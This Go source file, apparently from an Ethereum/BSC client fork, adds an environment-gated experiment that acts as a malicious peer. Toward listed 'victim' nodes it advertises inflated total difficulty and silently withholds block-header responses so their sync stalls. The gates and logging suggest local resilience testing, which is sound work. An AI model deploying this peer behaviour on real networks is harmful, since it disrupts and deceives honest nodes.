// Copyright 2026 The go-ethereum Authors
// This file is part of the go-ethereum library.

package eth

import (
	"errors"
	"fmt"
	"math/big"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"

	"github.com/ethereum/go-ethereum/log"
)

// The downloader experiment is intentionally configured through process-local
// environment variables instead of public CLI/config fields. This keeps the
// production protocol path unchanged unless an explicitly gated local test
// process is launched.
const (
	downloaderExperimentEnabledEnv     = "BSC_DOWNLOADER_EXPERIMENT_ENABLED"
	downloaderExperimentAckEnv         = "BSC_DOWNLOADER_EXPERIMENT_LOCAL_ONLY_ACK"
	downloaderExperimentNetworkIDEnv   = "BSC_DOWNLOADER_EXPERIMENT_NETWORK_ID"
	downloaderExperimentVictimsEnv     = "BSC_DOWNLOADER_EXPERIMENT_VICTIM_IDS"
	downloaderExperimentTDOffsetEnv    = "BSC_DOWNLOADER_EXPERIMENT_TD_OFFSET"
	downloaderExperimentModeEnv        = "BSC_DOWNLOADER_EXPERIMENT_MODE"
	downloaderExperimentAfterEnv       = "BSC_DOWNLOADER_EXPERIMENT_AFTER_REQUESTS"
	downloaderExperimentMaxTriggersEnv = "BSC_DOWNLOADER_EXPERIMENT_MAX_TRIGGERS"
	downloaderExperimentAckValue       = "LOCAL_TEST_ONLY"
	downloaderExperimentSilentHeaders  = "silent-header"
)

type downloaderExperimentConfig struct {
	enabled       bool
	networkID     uint64
	victims       map[string]struct{}
	tdOffset      *big.Int
	mode          string
	afterRequests uint64
	maxTriggers   uint64

	requests atomic.Uint64
	triggers atomic.Uint64
	active   sync.Map // peer ID -> struct{}, set only after a gated ETH handshake
}

var (
	downloaderExperimentOnce sync.Once
	downloaderExperimentCfg  *downloaderExperimentConfig
)

func getDownloaderExperimentConfig() *downloaderExperimentConfig {
	downloaderExperimentOnce.Do(func() {
		cfg, err := loadDownloaderExperimentConfig(os.Getenv)
		if err != nil {
			log.Error("Downloader experiment configuration rejected; experiment disabled", "err", err)
			downloaderExperimentCfg = &downloaderExperimentConfig{}
			return
		}
		downloaderExperimentCfg = cfg
		if cfg.enabled {
			log.Warn("Downloader local experiment enabled",
				"network", cfg.networkID,
				"victims", len(cfg.victims),
				"tdOffset", cfg.tdOffset,
				"mode", cfg.mode,
				"afterRequests", cfg.afterRequests,
				"maxTriggers", cfg.maxTriggers,
			)
		}
	})
	return downloaderExperimentCfg
}

func loadDownloaderExperimentConfig(getenv func(string) string) (*downloaderExperimentConfig, error) {
	cfg := &downloaderExperimentConfig{}
	enabled, err := strconv.ParseBool(strings.TrimSpace(getenv(downloaderExperimentEnabledEnv)))
	if err != nil && strings.TrimSpace(getenv(downloaderExperimentEnabledEnv)) != "" {
		return nil, fmt.Errorf("invalid %s: %w", downloaderExperimentEnabledEnv, err)
	}
	if !enabled {
		return cfg, nil
	}
	if getenv(downloaderExperimentAckEnv) != downloaderExperimentAckValue {
		return nil, fmt.Errorf("%s must equal %q", downloaderExperimentAckEnv, downloaderExperimentAckValue)
	}
	cfg.enabled = true

	networkID, err := strconv.ParseUint(strings.TrimSpace(getenv(downloaderExperimentNetworkIDEnv)), 10, 64)
	if err != nil || networkID == 0 {
		return nil, fmt.Errorf("%s must be a non-zero decimal network ID", downloaderExperimentNetworkIDEnv)
	}
	cfg.networkID = networkID

	cfg.victims = make(map[string]struct{})
	for _, raw := range strings.Split(getenv(downloaderExperimentVictimsEnv), ",") {
		if id := normalizeExperimentPeerID(raw); id != "" {
			cfg.victims[id] = struct{}{}
		}
	}
	if len(cfg.victims) == 0 {
		return nil, fmt.Errorf("%s must contain at least one exact victim node ID", downloaderExperimentVictimsEnv)
	}

	offsetText := strings.TrimSpace(getenv(downloaderExperimentTDOffsetEnv))
	if offsetText == "" {
		offsetText = "1000000"
	}
	cfg.tdOffset = new(big.Int)
	if _, ok := cfg.tdOffset.SetString(offsetText, 10); !ok || cfg.tdOffset.Sign() <= 0 {
		return nil, fmt.Errorf("%s must be a positive decimal integer", downloaderExperimentTDOffsetEnv)
	}

	cfg.mode = strings.TrimSpace(getenv(downloaderExperimentModeEnv))
	if cfg.mode == "" {
		cfg.mode = downloaderExperimentSilentHeaders
	}
	if cfg.mode != downloaderExperimentSilentHeaders {
		return nil, fmt.Errorf("unsupported %s %q", downloaderExperimentModeEnv, cfg.mode)
	}
	if cfg.afterRequests, err = parseOptionalExperimentUint(getenv(downloaderExperimentAfterEnv)); err != nil {
		return nil, fmt.Errorf("invalid %s: %w", downloaderExperimentAfterEnv, err)
	}
	if cfg.maxTriggers, err = parseOptionalExperimentUint(getenv(downloaderExperimentMaxTriggersEnv)); err != nil {
		return nil, fmt.Errorf("invalid %s: %w", downloaderExperimentMaxTriggersEnv, err)
	}
	return cfg, nil
}

func parseOptionalExperimentUint(value string) (uint64, error) {
	value = strings.TrimSpace(value)
	if value == "" {
		return 0, nil
	}
	parsed, err := strconv.ParseUint(value, 10, 64)
	if err != nil {
		return 0, err
	}
	return parsed, nil
}

func normalizeExperimentPeerID(raw string) string {
	id := strings.ToLower(strings.TrimSpace(raw))
	id = strings.TrimPrefix(id, "enode://")
	if at := strings.IndexByte(id, '@'); at >= 0 {
		id = id[:at]
	}
	return id
}

func (cfg *downloaderExperimentConfig) targets(peer *Peer) bool {
	if cfg == nil || !cfg.enabled || peer == nil {
		return false
	}
	_, ok := cfg.victims[normalizeExperimentPeerID(peer.ID())]
	return ok
}

// downloaderExperimentAdvertisedTD returns td unchanged for normal processes
// and non-target peers. For the explicitly whitelisted local victim it returns
// a copied, offset TD and marks the peer eligible for the request hook.
func downloaderExperimentAdvertisedTD(peer *Peer, networkID uint64, td *big.Int) *big.Int {
	cfg := getDownloaderExperimentConfig()
	if cfg == nil || !cfg.enabled || cfg.networkID != networkID || !cfg.targets(peer) || td == nil {
		return td
	}
	advertised := new(big.Int).Add(new(big.Int).Set(td), cfg.tdOffset)
	if advertised.BitLen() > 100 {
		peer.Log().Error("Downloader experiment TD exceeds ETH68 limit; using real TD",
			"realTD", td, "offset", cfg.tdOffset, "bitlen", advertised.BitLen())
		return td
	}
	cfg.active.Store(normalizeExperimentPeerID(peer.ID()), struct{}{})
	peer.Log().Warn("Downloader experiment advertising offset TD",
		"realTD", td, "advertisedTD", advertised, "offset", cfg.tdOffset)
	return advertised
}

// downloaderExperimentInterceptHeaders implements the first experiment mode:
// decode the request normally, but intentionally send no response to an exact
// victim peer. Returning handled=true makes the normal handler return nil and
// leaves the victim Downloader request pending until its own timeout fires.
func downloaderExperimentInterceptHeaders(peer *Peer, query *GetBlockHeadersPacket) (handled bool, err error) {
	cfg := getDownloaderExperimentConfig()
	if cfg == nil || !cfg.enabled || cfg.mode != downloaderExperimentSilentHeaders || !cfg.targets(peer) {
		return false, nil
	}
	peerID := normalizeExperimentPeerID(peer.ID())
	if _, ok := cfg.active.Load(peerID); !ok {
		return false, nil
	}
	requestNumber := cfg.requests.Add(1)
	if requestNumber <= cfg.afterRequests {
		return false, nil
	}
	triggerNumber, ok := cfg.reserveTrigger()
	if !ok {
		return false, nil
	}
	if query == nil || query.GetBlockHeadersRequest == nil {
		return false, errors.New("downloader experiment received nil header query")
	}
	peer.Log().Warn("Downloader experiment suppressing header response",
		"requestID", query.RequestId,
		"originHash", query.Origin.Hash,
		"originNumber", query.Origin.Number,
		"amount", query.Amount,
		"skip", query.Skip,
		"reverse", query.Reverse,
		"requestNumber", requestNumber,
		"triggerNumber", triggerNumber,
	)
	return true, nil
}

func (cfg *downloaderExperimentConfig) reserveTrigger() (uint64, bool) {
	for {
		current := cfg.triggers.Load()
		if cfg.maxTriggers > 0 && current >= cfg.maxTriggers {
			return current, false
		}
		if cfg.triggers.CompareAndSwap(current, current+1) {
			return current + 1, true
		}
	}
}
